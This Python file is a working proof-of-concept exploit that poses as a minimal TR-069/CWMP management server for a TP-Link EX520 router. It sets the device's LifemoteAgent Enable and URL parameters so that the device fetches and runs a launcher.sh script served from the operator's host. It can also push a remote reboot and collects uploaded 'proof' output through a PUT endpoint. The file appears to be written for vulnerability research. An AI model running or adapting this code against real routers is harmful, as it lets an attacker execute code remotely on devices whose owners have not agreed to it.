#!/usr/bin/env python3
"""Minimal CWMP ACS for EX520 proof loop.

Implements only the SOAP sequence required to receive an Inform and then
send GetParameterValues / SetParameterValues to Device.X_TP_LIFEMOTE_EXT.LifemoteAgent.
Also supports a /reboot_now trigger to issue a cwmp:Reboot command.
"""
import os, re, time
from http.server import HTTPServer, BaseHTTPRequestHandler

HOST = os.environ.get("PACKAGE_HOST", "192.168.0.27")
PORT = int(os.environ.get("PACKAGE_PORT", "8080"))
ROOT = os.environ.get("PACKAGE_ROOT", os.path.dirname(os.path.abspath(__file__)))

LOG = os.path.join(ROOT, "acs_session.txt")
PROOF_LOG = os.path.join(ROOT, "proof_log.txt")

# Path and script settings
LIFEMOTE_BASE = "Device.X_TP_LIFEMOTE_EXT.LifemoteAgent"
LAUNCHER_URL = f"http://{HOST}:{PORT}/launcher.sh"

STEP_INFORM = 0
STEP_GETPV_SENT = 1
STEP_SETPV_SENT = 2
STEP_REBOOT_SENT = 3
STEP_DONE = 4

cwmp_state = {
    "step": STEP_INFORM,
    "last_id": 1008,
    "session_count": 0,
    "pending_command": "execute",   # "execute" | "reboot"
    "cold_boot_expected": False,
    "setpv_phase": 0,               # 0 = first SetPV, 1 = second SetPV (toggle Enable)
    "current_enable": None,
}

def log(msg):
    ts = time.strftime("%Y-%m-%dT%H:%M:%S%z")
    line = f"{ts} {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")

def next_id():
    cwmp_state["last_id"] += 1
    return cwmp_state["last_id"]

def build_envelope(cid, body):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">{cid}</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
{body}
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>'''.encode("utf-8")

def inform_response(cid):
    body = "<cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse>"
    return build_envelope(cid, body)

def get_param_values(cid, names):
    items = "".join(f"<string>{n}</string>" for n in names)
    body = f'''<cwmp:GetParameterValues>
<ParameterNames SOAP-ENC:arrayType="xsd:string[{len(names)}]">
{items}
</ParameterNames>
</cwmp:GetParameterValues>'''
    return build_envelope(cid, body)

def set_param_values(cid, params):
    """params: list of (Name, Value, xsi:type)"""
    n = len(params)
    items = "".join(
        f"<ParameterValueStruct><Name>{name}</Name><Value xsi:type=\"{type_}\">{val}</Value></ParameterValueStruct>"
        for name, val, type_ in params
    )
    body = f'''<cwmp:SetParameterValues>
<ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[{n}]">
{items}
</ParameterList>
<ParameterKey>detectic-cwmp-proof</ParameterKey>
</cwmp:SetParameterValues>'''
    return build_envelope(cid, body)

def reboot_request(cid):
    body = "<cwmp:Reboot><CommandKey>detectic-cwmp-reboot</CommandKey></cwmp:Reboot>"
    return build_envelope(cid, body)

def _parse_enable_from_getpv(body_text):
    m = re.search(rf'<Name>{re.escape(LIFEMOTE_BASE)}\.Enable</Name>\s*<Value[^>]*>([^<]+)</Value>', body_text)
    if m:
        return m.group(1).strip()
    return None

def _send_setpv(self, enable_val, url_val):
    cid = str(next_id())
    params = [
        (f"{LIFEMOTE_BASE}.Enable", enable_val, "xsd:boolean"),
        (f"{LIFEMOTE_BASE}.URL", url_val, "xsd:string"),
    ]
    log(f"sending SetParameterValues phase={cwmp_state['setpv_phase']} params={params}")
    resp = set_param_values(cid, params)
    self._write_request(resp)
    with open(LOG, "a") as f:
        f.write(f"===== SETPV REQUEST phase={cwmp_state['setpv_phase']} =====\n")
        f.write(resp.decode("utf-8", "replace"))
        f.write("\n")

class AcsHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        log(fmt % args)

    def _write_request(self, body_bytes, close=False):
        self.send_response(200)
        if close:
            self.send_header("Connection", "close")
        else:
            self.send_header("Connection", "keep-alive")
        self.send_header("Content-Type", "text/xml; charset=utf-8")
        self.send_header("Content-Length", str(len(body_bytes)))
        self.end_headers()
        if body_bytes:
            self.wfile.write(body_bytes)

    def _write_empty(self, close=False):
        self.send_response(200)
        if close:
            self.send_header("Connection", "close")
        else:
            self.send_header("Connection", "keep-alive")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _parse_cwmp_id(self, body):
        m = re.search(r'<cwmp:ID[^>]*>([^<]+)</cwmp:ID>', body)
        return m.group(1) if m else None

    def _tag_in_body(self, body, *tags):
        # Check longer names first so e.g. GetParameterValuesResponse is not matched as GetParameterValues
        for t in sorted(tags, key=len, reverse=True):
            if re.search(rf'<cwmp:{t}(?:\s|>)', body):
                return t
        return None

    def do_GET(self):
        path = self.path
        if '?' in path:
            path = path.split('?')[0]
        if path.startswith('/'):
            path = path[1:]

        if path == 'reboot_now':
            cwmp_state["pending_command"] = "reboot"
            log("/reboot_now requested: will issue cwmp:Reboot on next Inform")
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"reboot queued\n")
            return

        if path == 'status':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(repr(cwmp_state).encode() + b"\n")
            return

        if '..' in path or path.startswith('.') or not path:
            self.send_response(403)
            self.end_headers()
            return
        fpath = os.path.normpath(os.path.join(ROOT, path))
        if not fpath.startswith(ROOT):
            self.send_response(403)
            self.end_headers()
            return
        if not os.path.exists(fpath):
            self.send_response(404)
            self.end_headers()
            return
        with open(fpath, 'rb') as f:
            data = f.read()
        self.send_response(200)
        if fpath.endswith('.sh'):
            self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        body_text = body.decode("utf-8", "replace")
        cid = self._parse_cwmp_id(body_text)
        tag = self._tag_in_body(body_text,
                                "Inform", "InformResponse",
                                "GetParameterValues", "GetParameterValuesResponse",
                                "SetParameterValues", "SetParameterValuesResponse",
                                "Fault", "Download", "DownloadResponse",
                                "TransferComplete", "TransferCompleteResponse",
                                "Reboot", "RebootResponse",
                                "GetRPCMethods", "GetRPCMethodsResponse")

        log(f"POST tag={tag} cid={cid} len={length} step={cwmp_state['step']} phase={cwmp_state['setpv_phase']} pending={cwmp_state['pending_command']} cold={cwmp_state['cold_boot_expected']}")
        with open(LOG, "a") as f:
            f.write(f"===== REQUEST tag={tag} cid={cid} =====\n")
            f.write(body_text)
            f.write("\n")

        if tag == "Inform":
            cwmp_state["step"] = STEP_INFORM
            cwmp_state["session_count"] += 1
            cwmp_state["setpv_phase"] = 0
            cwmp_state["current_enable"] = None
            if cwmp_state["cold_boot_expected"]:
                cwmp_state["cold_boot_expected"] = False
                log("cold-boot Inform received")
            log("sending InformResponse")
            self._write_request(inform_response(cid))
            with open(LOG, "a") as f:
                f.write("===== INFORMRESPONSE =====\n")
                f.write(inform_response(cid).decode("utf-8", "replace"))
                f.write("\n")

        elif cwmp_state["step"] == STEP_INFORM:
            if cwmp_state["pending_command"] == "reboot":
                cwmp_state["step"] = STEP_REBOOT_SENT
                cid = str(next_id())
                log("sending Reboot")
                resp = reboot_request(cid)
                self._write_request(resp)
                cwmp_state["pending_command"] = "execute"
                cwmp_state["cold_boot_expected"] = True
                with open(LOG, "a") as f:
                    f.write("===== REBOOT REQUEST =====\n")
                    f.write(resp.decode("utf-8", "replace"))
                    f.write("\n")
            else:
                cwmp_state["step"] = STEP_GETPV_SENT
                cid = str(next_id())
                names = [
                    f"{LIFEMOTE_BASE}.Enable",
                    f"{LIFEMOTE_BASE}.URL",
                ]
                log(f"sending GetParameterValues names={names}")
                resp = get_param_values(cid, names)
                self._write_request(resp)
                with open(LOG, "a") as f:
                    f.write("===== GETPV REQUEST =====\n")
                    f.write(resp.decode("utf-8", "replace"))
                    f.write("\n")

        elif tag == "GetParameterValuesResponse":
            cwmp_state["step"] = STEP_SETPV_SENT
            cwmp_state["current_enable"] = _parse_enable_from_getpv(body_text)
            log(f"GetParameterValues Enable={cwmp_state['current_enable']}")
            # Toggle: if currently 1, set to 0 first to force rsl_set on the next 1
            if cwmp_state["current_enable"] == "1":
                _send_setpv(self, "0", LAUNCHER_URL)
            else:
                _send_setpv(self, "1", LAUNCHER_URL)

        elif tag == "SetParameterValuesResponse":
            if cwmp_state["setpv_phase"] == 0 and cwmp_state["current_enable"] == "1":
                # First SetPV turned Enable 1 -> 0; now turn it back 0 -> 1 to start phoenix
                cwmp_state["setpv_phase"] = 1
                cwmp_state["step"] = STEP_SETPV_SENT
                _send_setpv(self, "1", LAUNCHER_URL)
            else:
                cwmp_state["step"] = STEP_DONE
                log("SetParameterValues final accepted, closing session")
                self._write_empty(close=True)

        elif tag == "RebootResponse":
            cwmp_state["step"] = STEP_DONE
            log("Reboot accepted by CPE, expecting disconnect")
            self._write_empty(close=True)

        elif tag == "Fault":
            log(f"CPE FAULT: {body_text[:400]}")
            self._write_empty(close=True)

        else:
            log(f"unknown/empty body, closing (tag={tag})")
            self._write_empty(close=True)

    def do_PUT(self):
        parsed = __import__('urllib.parse').parse.urlparse(self.path)
        length = int(self.headers.get('Content-Length') or 0)
        body = self.rfile.read(length) if length else b''
        ts = time.strftime("%Y-%m-%dT%H:%M:%S%z")
        tag = parsed.query.split('=')[1] if '=' in parsed.query else 'unknown'
        with open(PROOF_LOG, "a") as f:
            f.write(f"===== {ts} PROOF tag={tag} =====\n")
            f.write(body.decode("utf-8", "replace"))
            f.write("\n")
        log(f"PROOF UPLOAD tag={tag} {length} bytes")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok\n")

if __name__ == "__main__":
    os.chdir(ROOT)
    open(LOG, "w").close()
    open(PROOF_LOG, "w").close()
    log(f"EX520 minimal ACS on {HOST}:{PORT}")
    log(f"launcher URL: {LAUNCHER_URL}")
    HTTPServer.allow_reuse_address = True
    server = HTTPServer((HOST, PORT), AcsHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
